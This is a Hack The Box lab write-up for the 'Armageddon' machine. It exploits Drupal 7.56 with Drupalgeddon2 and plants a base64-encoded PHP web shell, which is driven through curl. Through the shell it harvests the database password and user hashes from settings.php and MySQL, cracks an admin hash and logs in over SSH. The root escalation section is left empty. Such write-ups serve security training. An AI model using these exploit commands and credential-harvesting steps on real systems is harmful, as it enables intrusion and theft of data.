# Introduction

[![Armageddon](https://www.hackthebox.eu/storage/avatars/4256f259c8ac66a3eda11206371eaf8b.png)](https://app.hackthebox.eu/machines/323)

| Point | Description |
| :------:| :------: |
| Name | Armageddon |
| OS   | Linux  |
| Difficulty Rating| Easy   |
| Release | 27 Mar 2021   |
| IP | 10.10.10.233   |
| Owned | 15 Apr 2021 |

# Short retelling
* Find vulearable version of CMS
* Using exploit and get php web shell
* Enumeration and find credentionals
* Connect to mysql database and find hash
* Get user.txt
* Find exploit for snapd
* Create and install trojan snap
* Login with creds of new user
* Get root.txt

# Enumeration

## Nmap

Recon host 10.10.10.233 with nmap. Add armageddon.htb to /etc/hosts
```

```

Ports 80 and 22 are open 

Lets check http://armageddon.htb

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_223157.png)

We can see *User Login* form. Trying to create a new account.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_223157.png)

And we get error and can't log in.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-02_223157.png)

Next step we are checking source code of page and find out about CMS *drupal* and ut's version *7*.

Searching some exploits for this version and find:

* https://medium.com/@briskinfosec/drupal-core-remote-code-execution-vulnerability-cve-2019-6340-35dee6175afa
* https://github.com/pimps/CVE-2018-7600
* https://github.com/dreadlocked/Drupalgeddon2

And we will use exploit *Drupalggedon2* on ruby language.

# Explotation

Let's run drupalgeddon2.rb and we get success.

```
┌──(root💀kali)-[/home/kali/HTB/armageddon]
└─# ruby drupalgeddon2.rb -h               
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://-h/
--------------------------------------------------------------------------------
[-] Network connectivity issue
                                                                                                                      
┌──(root💀kali)-[/home/kali/HTB/armageddon]
└─# ruby drupalgeddon2.rb http://armageddon.htb/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://armageddon.htb/
--------------------------------------------------------------------------------
[+] Found  : http://armageddon.htb/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo PCNQFWOO
[+] Result : PCNQFWOO
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://armageddon.htb/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://armageddon.htb/shell.php' -d 'c=hostname'
armageddon.htb>> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
armageddon.htb>> hostname
armageddon.htb
armageddon.htb>> pwd
/var/www/html
```

And we get PHP Web shell to RCE.

But we can't use reverse shell because of system settings this machine.

# Privilege Escalation#1

Trying to find some credentianals..

```
armageddon.htb>> grep -r -i "password"
CHANGELOG.txt:- Fixed that following a password reset link while logged in leaves users unable
CHANGELOG.txt:  to change their password (minor user interface change:
CHANGELOG.txt:  elements, such as textfields, textareas, and password fields (API change:
CHANGELOG.txt:- Changed the password reset form to pre-fill the username when requested via a
...
sites/default/default.settings.php: *     'password' => 'password',
sites/default/default.settings.php: * by using the username and password variables. The proxy_user_agent variable
sites/default/default.settings.php:# $conf['proxy_password'] = '';
sites/default/settings.php: *   'password' => 'password',
sites/default/settings.php: * username, password, host, and database name.
sites/default/settings.php: *   'password' => 'password',
sites/default/settings.php: *   'password' => 'password',
sites/default/settings.php: *     'password' => 'password',
sites/default/settings.php: *     'password' => 'password',
sites/default/settings.php:      'password' => 'CQHEy@9M*m23gBVj',
sites/default/settings.php: * by using the username and password variables. The proxy_user_agent variable
sites/default/settings.php:# $conf['proxy_password'] = '';
themes/bartik/css/ie.css:#password-strength-text {
themes/bartik/css/style-rtl.css:/* -------------- Password Meter  ------------- */
...
```

And we find interesting password *'password' => 'CQHEy@9M*m23gBVj',* in file *sites/default/settings.php*.

Let's read this file

```
armageddon.htb>> cat sites/default/settings.php 
<?php

/**
 * @file
 * Drupal site-specific configuration file.
 *
 
...

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

...

```

And we find out credentinals to connect mysql database

```
'username' => 'drupaluser',
'password' => 'CQHEy@9M*m23gBVj'
```

Let's do it.

```
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases'
Database
information_schema
drupal
mysql
performance_schema
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal'

armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables'
Tables_in_drupal
actions
authmap
batch
block
block_custom
block_node_type
block_role
blocked_ips
cache
cache_block
cache_bootstrap
cache_field
cache_filter
cache_form
cache_image
cache_menu
cache_page
cache_path
comment
date_format_locale
date_format_type
date_formats
field_config
field_config_instance
field_data_body
field_data_comment_body
field_data_field_image
field_data_field_tags
field_revision_body
field_revision_comment_body
field_revision_field_image
field_revision_field_tags
file_managed
file_usage
filter
filter_format
flood
history
image_effects
image_styles
menu_custom
menu_links
menu_router
node
node_access
node_comment_statistics
node_revision
node_type
queue
rdf_mapping
registry
registry_file
role
role_permission
search_dataset
search_index
search_node_links
search_total
semaphore
sequences
sessions
shortcut_set
shortcut_set_users
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
variable
watchdog
```

And we see interesting table *users*.

Let's display all the data from this table.

```
armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users'
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone      language        picture init    data
0                                               NULL    0       0       0       0       NULL            0            NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu          filtered_html    1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu   a:1:{s:7:"overlay";i:1;}
3       hackme  $S$DxsFQHSyj97COJGAMpG9.lQ2Rs.JfgWvZ3.UOxs6AEM6u3ufaRlo hackme@gmail.com                        filtered_html 1618466489      0       0       0       Europe/London           0       hackme@gmail.com        NULL
4       test    $S$DPgrTXFj3pss3Wzr3ZWBz5td6hTHiFlY22BTLio6pzR9qVnkvKwf test@gmail.com                  filtered_html1618468492       0       0       0       Europe/London           0       test@gmail.com  NULL
5       test2   $S$DEKacolsr/JKrKNyomMSuIkJxglGevxTDFx.kIN4NvKsoUga6WR2 tayjojo33@gmail.com                     filtered_html 1618468535      0       0       0       Europe/London           0       tayjojo33@gmail.com     NULL
6       root    $S$DDrl6y0OosU1W8mH6kiX31UblBCK9BnxtW1gzwMBJHOVv70GCyJJ root@gmail.com                  filtered_html1618469566       0       0       0       Europe/London           0       root@gmail.com  NULL
7       pash3nlee       $S$D0cZ4vGpe9fhctcXeEy6hOQ/X4d9JOWIi5dx5NYWZRqpW4SqhIZN pasha@armageddon.htb                 filtered_html    1618473501      0       0       0       Europe/London           0       pasha@armageddon.htb    NULL
8       spamfakefor     $S$Dff.4TQypd64ohmlv5SlUphbfyulw6zhCbYo1vH69PY8heUHpQbm spam@fake.for                   filtered_html 1618473949      0       0       0       Europe/London           0       spam@fake.for   NULL
9       spam    $S$Dsby3tDVVA08hQdjojdOk0AxY5A3d5/.1tCqW5Q4hdxSHSlhPC1. spam@gmail.com                  filtered_html1618474013       0       0       0       Europe/London           0       spam@gmail.com  NULL
armageddon.htb>> 
```

And we find credentials

```
brucetherealadmin
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

Password looks like hash. so let's run John.

```

```

And we get password **booboo**

Use ssh to connect

```
┌──(root💀kali)-[/home/kali/HTB/armageddon]
└─# ssh brucetherealadmin@armageddon.htb             
brucetherealadmin@armageddon.htb's password: 
Last login: Thu Apr 15 09:39:12 2021 from 10.10.14.43
[brucetherealadmin@armageddon ~]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

And we find **user.txt**

```
[brucetherealadmin@armageddon ~]$ cat user.txt 
07aac9a86c708f4d45ce26d56e6eb226
```

# Privilege Escalation#2

# Resources

1. https://github.com/aljavier/exploit_laravel_cve-2018-15133
2. https://null-byte.wonderhowto.com/how-to/scan-websites-for-interesting-directories-files-with-gobuster-0197226/
3. https://gtfobins.github.io/

